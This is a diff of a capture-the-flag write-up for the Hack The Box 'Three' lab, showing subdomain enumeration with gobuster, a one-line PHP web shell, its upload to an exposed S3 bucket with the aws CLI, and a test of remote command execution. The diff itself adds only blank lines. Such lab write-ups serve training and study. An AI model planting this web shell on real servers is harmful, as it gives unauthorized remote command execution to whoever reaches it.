@@ -37,6 +37,7 @@ gobuster vhosts -w /usr/share/seclists/DNS/subdomains-top1million-5000.txt -u ht
 
 ![Vhost-Enumeration](Images/three_vhostenum.jpeg)
 
+
 Gobuster revealed that the sub-domain s3.thetoppers.htb exists. Visited the subdomain using a browser to confirm that the service is indeed running.
 
 ![S3-Status](Images/three_s3-confirmation.jpeg)
@@ -66,15 +67,18 @@ echo '<?php system($_GET['cmd']); ?>' >  shell.php
 
 ![Shell-Payload](Images/three_shell-payload.jpeg)
 
+
 Uploaded the PHP shell file to the S3 bucket 
 
 ```bash 
 aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
 ```
 
+
 ![Shell-Upload](Images/three_shell-upload.jpeg)
 
 Confirmed the existence of the uploaded shell by navigating to http://s3.thetoppers.htb/shell.php and executing the id command 
+
 
 [!Shell-Success](Images/three_shell-confirmation.jpeg)
 
